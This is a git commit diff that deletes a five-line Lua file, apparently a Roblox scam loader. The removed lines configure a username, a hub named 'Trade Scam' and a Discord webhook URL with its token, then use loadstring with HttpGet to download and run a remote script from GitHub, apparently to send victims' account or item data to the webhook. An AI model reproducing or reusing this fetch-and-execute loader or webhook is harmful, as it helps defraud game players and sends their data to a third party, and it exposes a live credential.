962a4844ea99011255d3843115222c9bfc5011be
scriptroblox2023 <133226064+scriptroblox2023@users.noreply.github.com>
2023-05-17 21:08:30 +0100

    Delete obf_2Pf9P4Q0FwrR0cLpngL54c43jl99SYaTtxjHipe2omrT16f91aR90rVov85CCMeK.lua

--- obf_2Pf9P4Q0FwrR0cLpngL54c43jl99SYaTtxjHipe2omrT16f91aR90rVov85CCMeK.lua
+++
@@ -1,5 +0,0 @@
-_G.Username = "Dallot15" 
-_G.HubName = "Trade Scam"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1098888127361331200/sRnCCVygd9yHiJbjxsDSwh9deZUxL7hEm4BsU0HaTJAOv48KdZvB8uhZDJCIP2-gPGio"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
